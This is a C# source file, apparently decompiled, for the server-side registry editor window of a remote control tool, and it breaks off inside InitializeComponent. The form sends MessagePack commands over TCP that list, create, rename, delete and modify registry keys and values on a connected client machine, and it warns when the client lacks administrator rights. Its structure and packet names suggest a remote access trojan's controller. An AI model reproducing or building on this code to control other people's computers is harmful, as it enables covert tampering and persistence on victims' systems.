using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.XtraBars;
using DevExpress.XtraEditors;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Microsoft.Win32;
using Server.Connection;
using Server.Helper;

namespace Server.Forms;

public class FormRegistryEditor : XtraForm
{
	private IContainer components;

	private ImageList imageRegistryDirectoryList;

	private ImageList imageRegistryKeyTypeList;

	public System.Windows.Forms.Timer timer1;

	private PopupMenu popupMenuRegistry;

	private BarSubItem barSubItem1;

	private BarButtonItem AddStringValue;

	private BarButtonItem AddBinaryValue;

	private BarButtonItem AddDwordValueMenu;

	private BarButtonItem AddQWordMenu;

	private BarButtonItem AddExStringValue;

	private BarButtonItem DeleteItemMenu;

	private BarButtonItem ReNameMenu;

	private BarButtonItem AddKeyMenu;

	private BarManager barManager1;

	private BarDockControl barDockControlTop;

	private BarDockControl barDockControlBottom;

	private BarDockControl barDockControlLeft;

	private BarDockControl barDockControlRight;

	private BarButtonItem AddMultiStringValue;

	private BarButtonItem ModifySelectedItemMenu;

	private BarButtonItem ModifySelBinaryData;

	private BarButtonItem DeleteSelItemMenu;

	private BarButtonItem RenameSelItemMenu;

	private PopupMenu popupMenuSelectedItem;

	private PopupMenu popupMenuList;

	private BarButtonItem barButtonItem1;

	private BarSubItem barSubItem2;

	private SplitContainer splitContainer;

	public RegistryTreeView tvRegistryDirectory;

	private AeroListView lstRegistryValues;

	private ColumnHeader hName;

	private ColumnHeader hType;

	private ColumnHeader hValue;

	private StatusStrip statusStrip1;

	private ToolStripStatusLabel selectedStripStatusLabel;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	public FormMain F { get; set; }

	internal Clients Client { get; set; }

	internal Clients ParentClient { get; set; }

	public FormRegistryEditor()
	{
		InitializeComponent();
	}

	private void FrmRegistryEditor_Load(object sender, EventArgs e)
	{
		if (!ParentClient.IsAdmin)
		{
			MessageBox.Show("The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete may not work properly!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
	}

	private void AddRootKey(RegistrySeeker.RegSeekerMatch match)
	{
		TreeNode treeNode = CreateNode(match.Key, match.Key, match.Data);
		treeNode.Nodes.Add(new TreeNode());
		tvRegistryDirectory.Nodes.Add(treeNode);
	}

	private TreeNode AddKeyToTree(TreeNode parent, RegistrySeeker.RegSeekerMatch subKey)
	{
		TreeNode treeNode = CreateNode(subKey.Key, subKey.Key, subKey.Data);
		parent.Nodes.Add(treeNode);
		if (subKey.HasSubKeys)
		{
			treeNode.Nodes.Add(new TreeNode());
		}
		return treeNode;
	}

	private TreeNode CreateNode(string key, string text, object tag)
	{
		return new TreeNode
		{
			Text = text,
			Name = key,
			Tag = tag
		};
	}

	public void AddKeys(string rootKey, RegistrySeeker.RegSeekerMatch[] matches)
	{
		if (string.IsNullOrEmpty(rootKey))
		{
			RegistrySeeker.RegSeekerMatch[] array = matches;
			foreach (RegistrySeeker.RegSeekerMatch match in array)
			{
				AddRootKey(match);
			}
			tvRegistryDirectory.SelectedNode = tvRegistryDirectory.Nodes[0];
			return;
		}
		TreeNode treeNode = GetTreeNode(rootKey);
		if (treeNode != null)
		{
			RegistrySeeker.RegSeekerMatch[] array = matches;
			foreach (RegistrySeeker.RegSeekerMatch subKey in array)
			{
				AddKeyToTree(treeNode, subKey);
			}
			treeNode.Expand();
		}
	}

	public void CreateNewKey(string rootKey, RegistrySeeker.RegSeekerMatch match)
	{
		TreeNode treeNode = GetTreeNode(rootKey);
		TreeNode treeNode2 = AddKeyToTree(treeNode, match);
		treeNode2.EnsureVisible();
		tvRegistryDirectory.SelectedNode = treeNode2;
		treeNode2.Expand();
		tvRegistryDirectory.LabelEdit = true;
		treeNode2.BeginEdit();
	}

	public void DeleteKey(string rootKey, string subKey)
	{
		TreeNode treeNode = GetTreeNode(rootKey);
		if (treeNode.Nodes.ContainsKey(subKey))
		{
			treeNode.Nodes.RemoveByKey(subKey);
		}
	}

	public void RenameKey(string rootKey, string oldName, string newName)
	{
		TreeNode treeNode = GetTreeNode(rootKey);
		if (treeNode.Nodes.ContainsKey(oldName))
		{
			treeNode.Nodes[oldName].Text = newName;
			treeNode.Nodes[oldName].Name = newName;
			tvRegistryDirectory.SelectedNode = treeNode.Nodes[newName];
		}
	}

	private TreeNode GetTreeNode(string path)
	{
		string[] array = path.Split('\\');
		TreeNode treeNode = tvRegistryDirectory.Nodes[array[0]];
		if (treeNode == null)
		{
			return null;
		}
		for (int i = 1; i < array.Length; i++)
		{
			treeNode = treeNode.Nodes[array[i]];
			if (treeNode == null)
			{
				return null;
			}
		}
		return treeNode;
	}

	public void CreateValue(string keyPath, RegistrySeeker.RegValueData value)
	{
		TreeNode treeNode = GetTreeNode(keyPath);
		if (treeNode != null)
		{
			List<RegistrySeeker.RegValueData> list = ((RegistrySeeker.RegValueData[])treeNode.Tag).ToList();
			list.Add(value);
			treeNode.Tag = list.ToArray();
			if (tvRegistryDirectory.SelectedNode == treeNode)
			{
				RegistryValueLstItem registryValueLstItem = new RegistryValueLstItem(value);
				lstRegistryValues.Items.Add(registryValueLstItem);
				lstRegistryValues.SelectedIndices.Clear();
				registryValueLstItem.Selected = true;
				lstRegistryValues.LabelEdit = true;
				registryValueLstItem.BeginEdit();
			}
			tvRegistryDirectory.SelectedNode = treeNode;
		}
	}

	public void DeleteValue(string keyPath, string valueName)
	{
		TreeNode treeNode = GetTreeNode(keyPath);
		if (treeNode == null)
		{
			return;
		}
		if (!RegValueHelper.IsDefaultValue(valueName))
		{
			treeNode.Tag = ((RegistrySeeker.RegValueData[])treeNode.Tag).Where((RegistrySeeker.RegValueData value) => value.Name != valueName).ToArray();
			if (tvRegistryDirectory.SelectedNode == treeNode)
			{
				lstRegistryValues.Items.RemoveByKey(valueName);
			}
		}
		else
		{
			RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == valueName);
			if (tvRegistryDirectory.SelectedNode == treeNode)
			{
				RegistryValueLstItem registryValueLstItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == valueName);
				if (registryValueLstItem != null)
				{
					registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString(null);
				}
			}
		}
		tvRegistryDirectory.SelectedNode = treeNode;
	}

	public void RenameValue(string keyPath, string oldName, string newName)
	{
		TreeNode treeNode = GetTreeNode(keyPath);
		if (treeNode == null)
		{
			return;
		}
		((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == oldName).Name = newName;
		if (tvRegistryDirectory.SelectedNode == treeNode)
		{
			RegistryValueLstItem registryValueLstItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == oldName);
			if (registryValueLstItem != null)
			{
				registryValueLstItem.RegName = newName;
			}
		}
		tvRegistryDirectory.SelectedNode = treeNode;
	}

	public void ChangeValue(string keyPath, RegistrySeeker.RegValueData value)
	{
		TreeNode treeNode = GetTreeNode(keyPath);
		if (treeNode == null)
		{
			return;
		}
		RegistrySeeker.RegValueData dest = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == value.Name);
		ChangeRegistryValue(value, dest);
		if (tvRegistryDirectory.SelectedNode == treeNode)
		{
			RegistryValueLstItem registryValueLstItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == value.Name);
			if (registryValueLstItem != null)
			{
				registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value);
			}
		}
		tvRegistryDirectory.SelectedNode = treeNode;
	}

	private void ChangeRegistryValue(RegistrySeeker.RegValueData source, RegistrySeeker.RegValueData dest)
	{
		if (source.Kind == dest.Kind)
		{
			dest.Data = source.Data;
		}
	}

	private void UpdateLstRegistryValues(TreeNode node)
	{
		selectedStripStatusLabel.Text = node.FullPath;
		RegistrySeeker.RegValueData[] values = (RegistrySeeker.RegValueData[])node.Tag;
		PopulateLstRegistryValues(values);
	}

	private void PopulateLstRegistryValues(RegistrySeeker.RegValueData[] values)
	{
		lstRegistryValues.Items.Clear();
		values = values.OrderBy((RegistrySeeker.RegValueData value) => value.Name).ToArray();
		RegistrySeeker.RegValueData[] array = values;
		for (int i = 0; i < array.Length; i++)
		{
			RegistryValueLstItem value2 = new RegistryValueLstItem(array[i]);
			lstRegistryValues.Items.Add(value2);
		}
	}

	private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
	{
		if (e.Label != null)
		{
			e.CancelEdit = true;
			if (e.Label.Length > 0)
			{
				if (e.Node.Parent.Nodes.ContainsKey(e.Label))
				{
					MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					e.Node.BeginEdit();
					return;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "RenameRegistryKey";
				msgPack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
				msgPack.ForcePathObject("NewKeyName").AsString = e.Label;
				msgPack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				tvRegistryDirectory.LabelEdit = false;
			}
			else
			{
				MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				e.Node.BeginEdit();
			}
		}
		else
		{
			tvRegistryDirectory.LabelEdit = false;
		}
	}

	private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
	{
		TreeNode node = e.Node;
		if (string.IsNullOrEmpty(node.FirstNode.Name))
		{
			tvRegistryDirectory.SuspendLayout();
			node.Nodes.Clear();
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "LoadRegistryKey";
			msgPack.ForcePathObject("RootKeyName").AsString = node.FullPath;
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			Thread.Sleep(500);
			tvRegistryDirectory.ResumeLayout();
			e.Cancel = true;
		}
	}

	private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
	{
		UpdateLstRegistryValues(e.Node);
	}

	private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Delete && GetDeleteState())
		{
			deleteRegistryKey_Click(this, e);
		}
	}

	private void CreateEditToolStrip()
	{
	}

	private void CreateListViewMenuStrip()
	{
		BarButtonItem modifySelectedItemMenu = ModifySelectedItemMenu;
		bool enabled = (ModifySelBinaryData.Enabled = lstRegistryValues.SelectedItems.Count == 1);
		modifySelectedItemMenu.Enabled = enabled;
		RenameSelItemMenu.Enabled = lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(lstRegistryValues.SelectedItems[0].Name);
		DeleteSelItemMenu.Enabled = tvRegistryDirectory.SelectedNode != null && lstRegistryValues.SelectedItems.Count > 0;
	}

	private void editToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
	{
		CreateEditToolStrip();
	}

	private void menuStripExit_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void menuStripDelete_Click(object sender, EventArgs e)
	{
		if (tvRegistryDirectory.Focused)
		{
			deleteRegistryKey_Click(this, e);
		}
		else if (lstRegistryValues.Focused)
		{
			deleteRegistryValue_Click(this, e);
		}
	}

	private void menuStripRename_Click(object sender, EventArgs e)
	{
		if (tvRegistryDirectory.Focused)
		{
			renameRegistryKey_Click(this, e);
		}
		else if (lstRegistryValues.Focused)
		{
			renameRegistryValue_Click(this, e);
		}
	}

	private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			Point point = new Point(e.X, e.Y);
			if (lstRegistryValues.GetItemAt(point.X, point.Y) == null)
			{
				popupMenuList.ShowPopup(lstRegistryValues.PointToScreen(e.Location));
				return;
			}
			CreateListViewMenuStrip();
			popupMenuSelectedItem.ShowPopup(lstRegistryValues.PointToScreen(e.Location));
		}
	}

	private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
	{
		if (e.Label != null && tvRegistryDirectory.SelectedNode != null)
		{
			e.CancelEdit = true;
			int item = e.Item;
			if (e.Label.Length > 0)
			{
				if (lstRegistryValues.Items.ContainsKey(e.Label))
				{
					MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					lstRegistryValues.Items[item].BeginEdit();
					return;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "RenameRegistryValue";
				msgPack.ForcePathObject("OldValueName").AsString = lstRegistryValues.Items[item].Name;
				msgPack.ForcePathObject("NewValueName").AsString = e.Label;
				msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				lstRegistryValues.LabelEdit = false;
			}
			else
			{
				MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				lstRegistryValues.Items[item].BeginEdit();
			}
		}
		else
		{
			lstRegistryValues.LabelEdit = false;
		}
	}

	private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Delete && GetDeleteState())
		{
			deleteRegistryValue_Click(this, e);
		}
	}

	private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
	{
		if (e.Node == tvRegistryDirectory.SelectedNode)
		{
			createNewRegistryKey_Click(this, e);
			tvRegistryDirectory.AfterExpand -= createRegistryKey_AfterExpand;
		}
	}

	private bool GetDeleteState()
	{
		if (lstRegistryValues.Focused)
		{
			return lstRegistryValues.SelectedItems.Count > 0;
		}
		if (tvRegistryDirectory.Focused && tvRegistryDirectory.SelectedNode != null)
		{
			return tvRegistryDirectory.SelectedNode.Parent != null;
		}
		return false;
	}

	private bool GetRenameState()
	{
		if (lstRegistryValues.Focused)
		{
			if (lstRegistryValues.SelectedItems.Count == 1)
			{
				return !RegValueHelper.IsDefaultValue(lstRegistryValues.SelectedItems[0].Name);
			}
			return false;
		}
		if (tvRegistryDirectory.Focused && tvRegistryDirectory.SelectedNode != null)
		{
			return tvRegistryDirectory.SelectedNode.Parent != null;
		}
		return false;
	}

	private Form GetEditForm(RegistrySeeker.RegValueData value, RegistryValueKind valueKind)
	{
		switch (valueKind)
		{
		case RegistryValueKind.String:
		case RegistryValueKind.ExpandString:
			return new FormRegValueEditString(value);
		case RegistryValueKind.DWord:
		case RegistryValueKind.QWord:
			return new FormRegValueEditWord(value);
		case RegistryValueKind.MultiString:
			return new FormRegValueEditMultiString(value);
		case RegistryValueKind.Binary:
			return new FormRegValueEditBinary(value);
		default:
			return null;
		}
	}

	private void CreateEditForm(bool isBinary)
	{
		_ = tvRegistryDirectory.SelectedNode.FullPath;
		string name = lstRegistryValues.SelectedItems[0].Name;
		RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])tvRegistryDirectory.SelectedNode.Tag).ToList().Find((RegistrySeeker.RegValueData item) => item.Name == name);
		RegistryValueKind valueKind = (isBinary ? RegistryValueKind.Binary : regValueData.Kind);
		using Form form = GetEditForm(regValueData, valueKind);
		if (form.ShowDialog() == DialogResult.OK)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	public void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void FormRegistryEditor_FormClosed(object sender, FormClosedEventArgs e)
	{
		ThreadPool.QueueUserWorkItem(delegate
		{
			Client?.Disconnected();
		});
	}

	private void createNewRegistryKey_Click(object sender, EventArgs e)
	{
		if (!tvRegistryDirectory.SelectedNode.IsExpanded && tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
		{
			tvRegistryDirectory.AfterExpand += createRegistryKey_AfterExpand;
			tvRegistryDirectory.SelectedNode.Expand();
			return;
		}
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
		msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey";
		msgPack.ForcePathObject("ParentPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
		ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
	}

	private void deleteRegistryKey_Click(object sender, EventArgs e)
	{
		string caption = "Confirm Key Delete";
		if (MessageBox.Show("Are you sure you want to permanently delete this key and all of its subkeys?", caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			string fullPath = tvRegistryDirectory.SelectedNode.Parent.FullPath;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
			msgPack.ForcePathObject("KeyName").AsString = tvRegistryDirectory.SelectedNode.Name;
			msgPack.ForcePathObject("ParentPath").AsString = fullPath;
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void renameRegistryKey_Click(object sender, EventArgs e)
	{
		tvRegistryDirectory.LabelEdit = true;
		tvRegistryDirectory.SelectedNode.BeginEdit();
	}

	private void createStringRegistryValue_Click(object sender, EventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "1";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void createBinaryRegistryValue_Click(object sender, EventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "3";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void createDwordRegistryValue_Click(object sender, EventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "4";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void createQwordRegistryValue_Click(object sender, EventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "11";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "7";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "2";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void deleteRegistryValue_Click(object sender, EventArgs e)
	{
	}

	private void renameRegistryValue_Click(object sender, EventArgs e)
	{
		lstRegistryValues.LabelEdit = true;
		lstRegistryValues.SelectedItems[0].BeginEdit();
	}

	private void modifyRegistryValue_Click(object sender, EventArgs e)
	{
		CreateEditForm(isBinary: false);
	}

	private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
	{
		CreateEditForm(isBinary: true);
	}

	private void AddExStringValue_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "2";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void DeleteItemMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		string obj = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + ((lstRegistryValues.SelectedItems.Count == 1) ? "this value?" : "these values?");
		string caption = "Confirm Value Delete";
		if (MessageBox.Show(obj, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
		{
			return;
		}
		foreach (object selectedItem in lstRegistryValues.SelectedItems)
		{
			if (selectedItem.GetType() == typeof(RegistryValueLstItem))
			{
				RegistryValueLstItem registryValueLstItem = (RegistryValueLstItem)selectedItem;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("ValueName").AsString = registryValueLstItem.RegName;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
	}

	private void AddDwordValueMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "4";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void AddKeyMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (!tvRegistryDirectory.SelectedNode.IsExpanded && tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
		{
			tvRegistryDirectory.AfterExpand += createRegistryKey_AfterExpand;
			tvRegistryDirectory.SelectedNode.Expand();
			return;
		}
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
		msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey";
		msgPack.ForcePathObject("ParentPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
		ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
	}

	private void AddQWordMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "11";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void ReNameMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		tvRegistryDirectory.LabelEdit = true;
		tvRegistryDirectory.SelectedNode.BeginEdit();
	}

	private void AddStringValue_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "1";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void AddBinaryValue_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "3";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void AddMultiStringValue_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (tvRegistryDirectory.SelectedNode != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
			msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			msgPack.ForcePathObject("Kindstring").AsString = "7";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private void tvRegistryDirectory_MouseUp(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			popupMenuRegistry.ShowPopup(tvRegistryDirectory.PointToScreen(e.Location));
		}
	}

	private void ModifySelectedItemMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		CreateEditForm(isBinary: false);
	}

	private void ModifySelBinaryData_ItemClick(object sender, ItemClickEventArgs e)
	{
		CreateEditForm(isBinary: true);
	}

	private void RenameSelItemMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		lstRegistryValues.LabelEdit = true;
		lstRegistryValues.SelectedItems[0].BeginEdit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormRegistryEditor));
		this.imageRegistryDirectoryList = new System.Windows.Forms.ImageList(this.components);
		this.imageRegistryKeyTypeList = new System.Windows.Forms.ImageList(this.components);
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.popupMenuRegistry = new DevExpress.XtraBars.PopupMenu(this.components);
		this.barSubItem1 = new DevExpress.XtraBars.BarSubItem();
		this.AddStringValue = new DevExpress.XtraBars.BarButtonItem();
		this.AddBinaryValue = new DevExpress.XtraBars.BarButtonItem();
		this.AddDwordValueMenu = new DevExpress.XtraBars.BarButtonItem();
		this.AddQWordMenu = new DevExpress.XtraBars.BarButtonItem();
		this.AddExStringValue = new DevExpress.XtraBars.BarButtonItem();
		this.AddMultiStringValue = new DevExpress.XtraBars.BarButtonItem();
		this.DeleteItemMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ReNameMenu = new DevExpress.XtraBars.BarButtonItem();
		this.AddKeyMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barManager1 = new DevExpress.XtraBars.BarManager(this.components);
		this.barDockControlTop = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlBottom = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlLeft = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlRight = new DevExpress.XtraBars.BarDockControl();
		this.ModifySelectedItemMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ModifySelBinaryData = new DevExpress.XtraBars.BarButtonItem();
		this.DeleteSelItemMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RenameSelItemMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barButtonItem1 = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem2 = new DevExpress.XtraBars.BarSubItem();
		this.popupMenuSelectedItem = new DevExpress.XtraBars.PopupMenu(this.components);
		this.popupMenuList = new DevExpress.XtraBars.PopupMenu(this.components);
		this.splitContainer = new System.Windows.Forms.SplitContainer();
		this.tvRegistryDirectory = new Server.Helper.RegistryTreeView();
		this.lstRegistryValues = new Server.Helper.AeroListView();
		this.hName = new System.Windows.Forms.ColumnHeader();
